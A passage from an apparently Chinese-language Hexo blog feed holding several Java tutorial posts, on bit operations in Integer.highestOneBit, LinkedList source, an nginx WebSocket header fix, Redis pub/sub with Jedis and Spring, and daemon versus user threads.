<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>初始容量为10</li>
<li>动态扩容容量为指定容量或者2倍</li>
<li>随机查找效率较高</li>
<li>插入和删除慢,需要移动元素</li>
<li>排序用归并排序和TimSort</li>
<li>动态删除元素会抛出异常,可用迭代器实现</li>
<li>线程安全</li>
</ul>
<h4 id="如有错误-欢迎批评指正-望不吝赐教"><a href="#如有错误-欢迎批评指正-望不吝赐教" class="headerlink" title="如有错误,欢迎批评指正,望不吝赐教!!!"></a>如有错误,欢迎批评指正,望不吝赐教!!!</h4></blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Integer.highestOneBit(i)源码解读</title>
    <url>/2017/12/19/java/Integer.highestOneBit(i)%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<p>Integer.highestOneBit(i)作用是取i这个数的二进制形式最左边的最高一位且高位后面全部补零,最后返回int型的结果。</p>
<p>highestOneBit 源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">100</span>;</span><br><span class="line">        System.out.println(Integer.toBinaryString(i));<span class="comment">//1100100</span></span><br><span class="line">        i |= (i &gt;&gt;  <span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">"1:"</span>+Integer.toBinaryString(i));<span class="comment">//1110110</span></span><br><span class="line">        i |= (i &gt;&gt;  <span class="number">2</span>);</span><br><span class="line">        System.out.println(<span class="string">"2:"</span>+Integer.toBinaryString(i));<span class="comment">//1111111</span></span><br><span class="line">        i |= (i &gt;&gt;  <span class="number">4</span>);</span><br><span class="line">        System.out.println(<span class="string">"3:"</span>+Integer.toBinaryString(i));<span class="comment">//1111111</span></span><br><span class="line">        i |= (i &gt;&gt;  <span class="number">8</span>);</span><br><span class="line">        System.out.println(<span class="string">"4:"</span>+Integer.toBinaryString(i));<span class="comment">//1111111</span></span><br><span class="line">        i |= (i &gt;&gt; <span class="number">16</span>);</span><br><span class="line">        System.out.println(<span class="string">"5:"</span>+Integer.toBinaryString(i));<span class="comment">//1111111</span></span><br><span class="line">        <span class="keyword">int</span> res =  i - (i &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">        System.out.println(res);<span class="comment">//64</span></span><br><span class="line">        System.out.println(Integer.toBinaryString(res));<span class="comment">//1000000</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>运算描述：</p>
<blockquote>
<ul>
<li>>&gt; 右移运算,转化为对应的二进制数右移n位,高位补0</li>
<li>&lt;&lt; 左移运算,,转化为对应的二进制数左移n位,高位补0</li>
<li>>&gt;&gt; 无符号右移,无符号右移的规则只记住一点：忽略了符号位扩展,0补最高位。无符号右移运算符&gt;&gt;&gt; 只是对32位和64位的值有意义。</li>
</ul>
</blockquote>
<p>补充</p>
<blockquote>
<h4 id="负数计算二进制"><a href="#负数计算二进制" class="headerlink" title="负数计算二进制"></a>负数计算二进制</h4></blockquote>
<p>假设有一 int 类型的数,值为5，那么我们知道它在计算机中表示为:00000000 00000000 00000000 00000101。<br>5转换成二制是101,不过int类型的数占用4字节（32位），所以前面填了一堆0。<br>现在想知道，-5在计算机中如何表示？</p>
<p>在计算机中，负数以其正值的补码形式表达。什么叫补码呢？这得从原码，反码说起。</p>
<p>原码：一个整数，按照绝对值大小转换成的二进制数，称为原码。<br>比如 00000000 00000000 00000000 00000101 是 5的 原码。<br>　<br>反码：将二进制数按位取反，所得的新二进制数称为原二进制数的反码。<br>取反操作指：原为1，得0；原为0，得1。（1变0; 0变1）<br>比如：将00000000 00000000 00000000 00000101每一位取反，得11111111 11111111 11111111 11111010。<br>称：11111111 11111111 11111111 11111010 是 00000000 00000000 00000000 00000101 的反码。<br>反码是相互的，所以也可称：<br>11111111 11111111 11111111 11111010 和 00000000 00000000 00000000 00000101 互为反码。</p>
<p>补码：反码加1称为补码。<br>也就是说，要得到一个数的补码，先得到反码，然后将反码加上1，所得数称为补码。<br>比如：00000000 00000000 00000000 00000101 的反码是：11111111 11111111 11111111 11111010。<br>那么，补码为：<br>11111111 11111111 11111111 11111010 + 1 = 11111111 11111111 11111111 11111011<br>所以，-5 在计算机中表达为：11111111 11111111 11111111 11111011。转换为十六进制：0xFFFFFFFB。</p>
<blockquote>
<h4 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h4></blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">A</th>
<th style="text-align:center">B</th>
<th style="text-align:center">&amp;（与）</th>
<th style="text-align:center">或</th>
<th style="text-align:center">^(异或)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java集合源码分析之LinkedList</title>
    <url>/2018/06/03/java/java%E9%9B%86%E5%90%88%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8BLinkedList/</url>
    <content><![CDATA[<p>源码分析以JDK1.8为例.</p>
<p>ArrayList就是动态数组,就是Array的复杂版本.它提供了动态的增加和减少元素,实现了Collection和List接口,灵活的设置数组的大小等好处.UML图如下:</p>
<p><img src="/2018/06/03/java/java集合源码分析之LinkedList/linkedList_1.png" alt="LinkedList"></p>
<a id="more"></a>
<h1 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h1><h2 id="公共属性"><a href="#公共属性" class="headerlink" title="公共属性"></a>公共属性</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"> <span class="comment">//元素个数</span></span><br><span class="line"><span class="keyword">transient</span> <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">   指向第一个节点</span></span><br><span class="line"><span class="comment">  * Pointer to first node.</span></span><br><span class="line"><span class="comment">  * Invariant: (first == null &amp;&amp; last == null) ||</span></span><br><span class="line"><span class="comment">  *            (first.prev == null &amp;&amp; first.item != null)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">transient</span> Node&lt;E&gt; first;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 指向最后一个节点</span></span><br><span class="line"><span class="comment">  * Pointer to last node.</span></span><br><span class="line"><span class="comment">  * Invariant: (first == null &amp;&amp; last == null) ||</span></span><br><span class="line"><span class="comment">  *            (last.next == null &amp;&amp; last.item != null)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">transient</span> Node&lt;E&gt; last;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Incompatibile SockJS! Main site uses &quot;1.1.5&quot;, the iframe &quot;1.0.0&quot;</title>
    <url>/2020/11/16/java/Incompatibile%20SockJS/</url>
    <content><![CDATA[<p>在spring boot 后端开发集成websocket的过程中，本地测试都OK,但是部署到服务器上后抛出了异常 Incompatibile SockJS! Main site uses: “1.1.5”, the iframe: “1.0.0”。</p>
<p> <img src="/2020/11/16/java/Incompatibile SockJS/20200908095249926.png" alt></p>
<p>大概意思是版本不匹配，和服务器部署唯一的不同之处就是服务器通过nginx来代理请求。<br><a id="more"></a><br>主要原因是upgrade header没有从nginx传给spring，nginx对应代理服务节点上配置下边的头信息即可:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#告诉nginx使用HTTP/1.1通信协议，这是websoket必须要使用的协议）</span><br><span class="line">proxy_http_version 1.1;</span><br><span class="line"></span><br><span class="line">#告诉nginx，当它想要使用WebSocket时，响应http升级请求</span><br><span class="line">proxy_set_header Upgrade $http_upgrade;</span><br><span class="line"></span><br><span class="line">proxy_set_header Connection &quot;upgrade&quot;;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/16/java/Incompatibile SockJS/20200225162241569.png" alt></p>
<p>nginx配置完成后重启nginx问题就解决了。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis发布订阅</title>
    <url>/2018/05/11/mq/Redis%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85/</url>
    <content><![CDATA[<p>今天开发一个功能,数据量比较大,而且是单机处理.系统现有1-9这九种奖品,8和9两种数据量比较大,<br>其中9比8多于30%数据左右,初期设计由定时任务处理,一个定时任务全部处理,数据量小的时候还好.<br>数据量大时(处理100W数据),业务涉及订单、奖品、用户金额变动,事物提交占用时间长。会出现锁超时情况比较多.<br>为解决这个问题,打算引入redis发布订阅来解决此问题.<br>1-7处理完成后,redis中放入指定信息。8和9分别订阅此信息,同时开始处理业务。其中8,9也是各自一次处理1000条数据,<br>直至完成.</p>
<h1 id="redis发布订阅测试代码"><a href="#redis发布订阅测试代码" class="headerlink" title="redis发布订阅测试代码"></a>redis发布订阅测试代码</h1><p>配置事件通知类型<br>notify-keyspace-events Ex</p>
<p>配置项参考:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  K     Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.</span></span><br><span class="line"><span class="comment">#  E     Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.</span></span><br><span class="line"><span class="comment">#  g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...</span></span><br><span class="line"><span class="comment">#  $     String commands</span></span><br><span class="line"><span class="comment">#  l     List commands</span></span><br><span class="line"><span class="comment">#  s     Set commands</span></span><br><span class="line"><span class="comment">#  h     Hash commands</span></span><br><span class="line"><span class="comment">#  z     Sorted set commands</span></span><br><span class="line"><span class="comment">#  x     Expired events (events generated every time a key expires)</span></span><br><span class="line"><span class="comment">#  e     Evicted events (events generated when a key is evicted for maxmemory)</span></span><br><span class="line"><span class="comment">#  A     Alias for g$lshzxe, so that the "AKE" string means all the events.</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p>java示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPubSub;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"> <span class="comment">/** </span></span><br><span class="line"><span class="comment">  *  发布订阅监听</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PubSubListener</span> <span class="keyword">extends</span> <span class="title">JedisPubSub</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger log = LoggerFactory.getLogger(PubSubListener.class);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 消息接收</span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onMessage</span><span class="params">(String channel, String message)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"onMessage channel=&#123;&#125;,message=&#123;&#125;"</span>,channel,message);</span><br><span class="line">        <span class="keyword">super</span>.onMessage(channel, message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSubscribe</span><span class="params">(String channel, <span class="keyword">int</span> subscribedChannels)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"onSubscribe channel=&#123;&#125;,subscribedChannels=&#123;&#125;"</span>,channel,subscribedChannels);</span><br><span class="line">        <span class="keyword">super</span>.onSubscribe(channel, subscribedChannels);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onUnsubscribe</span><span class="params">(String channel, <span class="keyword">int</span> subscribedChannels)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"onUnsubscribe channel=&#123;&#125;,subscribedChannels=&#123;&#125;"</span>,channel,subscribedChannels);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>.onUnsubscribe(channel, subscribedChannels);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPong</span><span class="params">(String pattern)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"onPong pattern=&#123;&#125;"</span>,pattern);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>.onPong(pattern);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unsubscribe</span><span class="params">(String... channels)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"unsubscribe channel=&#123;&#125;"</span>,Arrays.toString(channels));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>.unsubscribe(channels);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ping</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"ping"</span>);</span><br><span class="line">        <span class="keyword">super</span>.ping();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>junit Test</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 订阅指定channel信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Jedis jedis = <span class="keyword">new</span> Jedis(<span class="string">"localhost"</span>);</span><br><span class="line">    PubSubListener listener = <span class="keyword">new</span> PubSubListener();</span><br><span class="line">    jedis.subscribe(listener, <span class="string">"test"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发送消息到指定channel</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">    Jedis jedis = <span class="keyword">new</span> Jedis(<span class="string">"localhost"</span>);</span><br><span class="line">    jedis.publish(<span class="string">"test"</span>, <span class="string">"啊呀,..."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>redis的subscribe方法是阻塞的,spring-data-redis中使用RedisMessageListenerContainer来监听消息</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"jedisConnectionFactory"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">class</span>=<span class="string">"org.springframework.data.redis.connection.jedis.JedisConnectionFactory"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">p:host-name</span>=<span class="string">"localhost"</span> <span class="attr">p:port</span>=<span class="string">"6379"</span> <span class="attr">p:use-pool</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"redisTemplate"</span> <span class="attr">class</span>=<span class="string">"org.springframework.data.redis.core.RedisTemplate"</span> <span class="attr">p:connection-factory-ref</span>=<span class="string">"jedisConnectionFactory"</span>/&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"stringRedisTemplate"</span> <span class="attr">class</span>=<span class="string">"org.springframework.data.redis.core.StringRedisTemplate"</span> <span class="attr">p:connection-factory-ref</span>=<span class="string">"jedisConnectionFactory"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"redisMessageListener"</span> <span class="attr">class</span>=<span class="string">"com.alqsoft.init.RedisMessageListener"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"redisTemplate"</span> <span class="attr">ref</span>=<span class="string">"redisTemplate"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"redisContainer"</span> <span class="attr">class</span>=<span class="string">"org.springframework.data.redis.listener.RedisMessageListenerContainer"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"connectionFactory"</span> <span class="attr">ref</span>=<span class="string">"jedisConnectionFactory"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"messageListeners"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key-ref</span>=<span class="string">"redisMessageListener"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 匹配所有频道 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.data.redis.listener.PatternTopic"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"*"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.data.redis.connection.Message;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.RedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisMessageListener</span> <span class="keyword">implements</span> <span class="title">org</span>.<span class="title">springframework</span>.<span class="title">data</span>.<span class="title">redis</span>.<span class="title">connection</span>.<span class="title">MessageListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Logger log  = LoggerFactory.getLogger(RedisMessageListener.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;String,String&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RedisTemplate <span class="title">getRedisTemplate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRedisTemplate</span><span class="params">(RedisTemplate redisTemplate)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onMessage</span><span class="params">(Message message, <span class="keyword">byte</span>[] pattern)</span> </span>&#123;</span><br><span class="line">        RedisSerializer serializer = redisTemplate.getValueSerializer();</span><br><span class="line">        String messageStr = (String) serializer.deserialize(message.getBody());</span><br><span class="line">        String channel = <span class="keyword">new</span> String(message.getChannel());</span><br><span class="line">        log.info(<span class="string">"channel=&#123;&#125;,messageStr=&#123;&#125;"</span>,channel,messageStr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用RedisTemplate的convertAndSend方法发消息即可.</p>
<p>由于没有引入其他MQ,暂时用redis来替代.</p>
<p>至于redis和各个MQ的区别,参考知乎某一回答:</p>
<p><img src="https://i.imgur.com/bQrijJB.png" alt></p>
<h4 id="如有错误-欢迎批评指正-请不吝赐教"><a href="#如有错误-欢迎批评指正-请不吝赐教" class="headerlink" title="如有错误,欢迎批评指正,请不吝赐教."></a>如有错误,欢迎批评指正,请不吝赐教.</h4>]]></content>
      <categories>
        <category>mq</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>用户线程和守护线程</title>
    <url>/2019/08/30/java/%E7%94%A8%E6%88%B7%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%AE%88%E6%8A%A4%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<p>Java 提供了两种类型的线程：守护线程 和 用户线程。</p>
<blockquote>
<ul>
<li>用户线程是高优先级线程。JVM 在终止之前会等待所有用户线程完成其任务。</li>
<li>守护线程是低优先级线程。其唯一作用是为用户线程提供服务。</li>
</ul>
</blockquote>
<p>所有非守护线程执行完成后会退出 JVM,不管守护线程是否执行完成,所以在守护线程中不要做一些 IO 操作,可能会出现资源无法正常关闭等问题。</p>
<a id="more"></a>
<h1 id="守护线程的创建"><a href="#守护线程的创建" class="headerlink" title="守护线程的创建"></a>守护线程的创建</h1><p>通过 setDaemon(true)方法将线程设置为守护线程,并且必须在 start()方法之前设置否则会抛出 IllegalThreadStateException。通过 isDaemon()方法判断当前线程是否是守护线程，返回 true 表示当前线程为守护线程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 所有非守护线程执行完成后会退出JVM,不管守护线程是否执行完成.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DaemonThread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 设置为守护线程.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">daemon</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Thread thread = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        TimeUnit.DAYS.sleep(Long.MAX_VALUE);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="string">"Daemon-Thread"</span>);</span><br><span class="line">    thread.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">    thread.start();</span><br><span class="line">    System.out.println(<span class="string">"守护线程启动,"</span> + thread.getName());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    DaemonThread daemonThread = <span class="keyword">new</span> DaemonThread();</span><br><span class="line">    daemonThread.daemon();</span><br><span class="line">    TimeUnit.SECONDS.sleep(<span class="number">5</span>);</span><br><span class="line">    System.out.println(<span class="string">"main线程完成退出."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见主线程执行 5s 后 JVM 退出,此时虽然还是有 Daemon 线程运行.</p>
<p><img src="/2019/08/30/java/用户线程和守护线程/20190830174147.png" alt></p>
<p>再看另一种类型的主线程退出,但是仍有用户线程执行的情况.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 所有非守护线程执行完成后会退出JVM,不管守护线程是否执行完成.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DaemonThread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 设置为非守护线程.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">noneDaemon</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Thread thread = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        TimeUnit.DAYS.sleep(Long.MAX_VALUE);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="string">"NoneDaemon-Thread"</span>);</span><br><span class="line">    <span class="comment">// 设置为非守护线程</span></span><br><span class="line">    thread.setDaemon(<span class="keyword">false</span>);</span><br><span class="line">    thread.start();</span><br><span class="line">    System.out.println(<span class="string">"非守护线程启动,"</span> + thread.getName());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    DaemonThread daemonThread = <span class="keyword">new</span> DaemonThread();</span><br><span class="line">    daemonThread.noneDaemon();</span><br><span class="line">    TimeUnit.SECONDS.sleep(<span class="number">5</span>);</span><br><span class="line">    System.out.println(<span class="string">"main线程完成退出."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然主线程退出了,但是此时仍有用户线程执行 JVM 不会退出。</p>
<p><img src="/2019/08/30/java/用户线程和守护线程/20190830174627.png" alt></p>
<p>至此,大概的用户线程和守护线程的区别已介绍完了。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>414 Request-URI Too Large</title>
    <url>/2019/08/08/linux/414%20Request-URI%20Too%20Large/</url>
    <content><![CDATA[<p>发布文章时,访问服务器nginx错误信息:<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>414 Request-URI Too Large<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">"white"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>414 Request-URI Too Large<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">center</span>&gt;</span>openresty/1.13.6.2<span 